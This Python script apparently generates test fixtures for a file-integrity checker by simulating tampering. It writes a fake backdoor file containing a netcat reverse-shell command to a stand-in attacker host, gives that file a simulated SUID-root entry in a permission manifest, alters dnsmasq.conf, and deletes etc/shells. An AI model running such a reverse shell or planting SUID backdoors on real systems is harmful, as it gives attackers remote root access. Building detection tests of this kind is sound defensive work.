"""
Simulates a realistic, deliberate "attack" on data/suspicious:
1. Adds a new backdoor file
2. Modifies an existing configuration file
3. Applies a suspicious permission change (adds SUID) in the permission manifest

Note: SUID/SGID bits are simulated via a JSON permission manifest rather than
real filesystem chmod, because Windows/NTFS does not support Unix permission bits.
"""
import json
import os
import shutil
import stat

original_dir = "data/original"
suspicious_dir = "data/suspicious"
original_manifest_path = "data/original_permissions.json"
suspicious_manifest_path = "data/suspicious_permissions.json"

# Start suspicious manifest as a copy of the original manifest
with open(original_manifest_path, "r") as f:
    permissions = json.load(f)

# 1. Add backdoor file
backdoor_path = os.path.join(suspicious_dir, "usr/bin/update_service")
os.makedirs(os.path.dirname(backdoor_path), exist_ok=True)
with open(backdoor_path, "w") as f:
    f.write("#!/bin/sh\n# hidden backdoor: reverse_shell connection\nnc -e /bin/sh attacker.example.com 4444\n")
print(f"Backdoor added: {backdoor_path}")

# 2. Modify an existing file
target_file = os.path.join(suspicious_dir, "etc/dnsmasq.conf")
if os.path.exists(target_file):
    with open(target_file, "a") as f:
        f.write("\n# unauthorized modification\n")
    print(f"Modified: {target_file}")
else:
    print(f"Warning: {target_file} not found, skipped")

# 3. Suspicious permission change (simulate SUID bit in the manifest)
backdoor_relative_path = "usr/bin/update_service"
simulated_mode = stat.S_ISUID | stat.S_IRWXU  # SUID + rwx for owner
permissions[backdoor_relative_path] = {
    "mode": simulated_mode,
    "filemode": stat.filemode(simulated_mode),
    "uid": 0,
    "gid": 0,
}
print(f"SUID permission simulated in manifest: {backdoor_relative_path} -> {stat.filemode(simulated_mode)}")

with open(suspicious_manifest_path, "w") as f:
    json.dump(permissions, f, indent=2)

print(f"Suspicious permission manifest saved -> {suspicious_manifest_path}")
# 4. Delete an existing file (simulates an attacker removing evidence,
# e.g. a monitoring script or a restriction file)
file_to_delete = os.path.join(suspicious_dir, "etc/shells")
if os.path.exists(file_to_delete):
    os.remove(file_to_delete)
    print(f"Deleted (simulating evidence removal): {file_to_delete}")
else:
    print(f"Warning: {file_to_delete} not found, nothing to delete")
print("\nSimulation complete.")